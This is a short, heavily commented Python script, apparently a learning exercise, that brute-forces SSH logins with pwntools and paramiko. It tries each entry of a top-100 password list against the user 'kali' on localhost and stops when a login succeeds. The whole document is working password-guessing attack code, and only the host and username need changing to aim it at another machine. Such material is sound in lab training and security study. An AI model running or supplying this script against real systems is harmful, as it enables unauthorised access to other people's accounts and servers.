"""
- using pwn module to interact with ssh service, however under the hood the pwn
    module is making use of the paramiko module too
- for error handling we need the paramiko module
"""
from pwn import *
import paramiko

host = "127.0.0.1"
username = "kali"
attempts = 0 #log of attempts we've made to know how many requests its made

with open("10-million-password-list-top-100.txt", "r") as password_list:
    #open the file in read mode and iterate over each item in the pass list
    for password in password_list:
        password = password.strip("\n")#strip the new line for each pass in the list
        try:
            """
            if there's an authentication error we know the auth hasn't succeeded, however
        before we get to that step we first need to try to authenticate
            """
            print(f"[{attempts}] Attempting password: '{password}'!")
            """
            - print each attempt being made with a statement (attempt and password being used)
            - then perform actual authentitcation using ssh() function from pwn module
            - timeout is 1 second
            """
            response = ssh(host=host, user=username, password=password, timeout=1)
            if response.connected(): #checking if response is valid with connected()
                print(f"[>] Valid password found: '{password}'!")
                response.close() #if pass if correct we stop guessing and close connection
                break
            response.close() # if pass wasn't correct we close connection and try another pass in list
        except paramiko.ssh_exception.AuthenticationException:
            #set an exception so we know pass is not valid and add attempt
            print("[X] Invalid password!")
        attempts += 1